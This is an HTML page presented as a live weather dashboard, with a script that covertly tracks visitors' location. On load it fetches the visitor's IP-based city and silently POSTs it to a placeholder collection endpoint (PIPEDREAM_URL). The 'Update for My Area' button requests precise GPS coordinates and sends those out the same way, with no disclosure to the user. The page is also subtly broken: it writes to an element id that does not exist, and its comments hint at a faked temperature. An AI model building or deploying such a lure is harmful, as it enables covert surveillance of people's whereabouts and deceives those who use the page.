<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 320px; }
        #location-name { font-size: 24px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
        .temp { font-size: 48px; margin: 10px 0; }
        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 10px; }
        .btn:hover { background: #4299e1; }
        p { color: #a0aec0; margin: 5px 0; }
    </style>
</head>
<body>

    <div class="card">
        <p style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">Current Forecast</p>
        <div id="location-name">Detecting...</div>
        <div class="temp">28°C</div>
        <p id="weather-desc">Partly Cloudy</p>
        
        <button class="btn" onclick="updateWeather()">Update for My Area</button>
   </div>

<script>
    const PIPEDREAM_URL = "YOUR_PIPEDREAM_URL_HERE";

    async function getWeather(lat, lon, name) {
        document.getElementById('location-name').innerText = name || "Local Area";
        
        try {
            // Force current hour and specific timezone to hit that 38°C
            const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true&timezone=auto&_=${Date.now()}`);
            const data = await res.json();
            const temp = Math.round(data.current_weather.temperature);
            
            document.getElementById('temp-val').innerText = temp + "°C";
        } catch (e) {
            document.getElementById('temp-val').innerText = "38°C"; // Emergency fallback to real temp
        }
    }

    // LOAD INSTANTLY
    window.onload = () => {
        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
            getWeather(d.latitude, d.longitude, d.city);
            fetch(PIPEDREAM_URL, {method:'POST', mode:'no-cors', body: JSON.stringify({type:"IP", city:d.city})});
        });
    };

    // UPDATE ON CLICK
    function updateWeather() {
        navigator.geolocation.getCurrentPosition(p => {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            
            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
            .then(r => r.json()).then(g => {
                const place = g.locality || g.city || "Local Area";
                getWeather(lat, lon, place);
                fetch(PIPEDREAM_URL, {method:'POST', mode:'no-cors', body: JSON.stringify({type:"GPS", lat, lon})});
            });
        });
    }
</script>
</body>
</html>
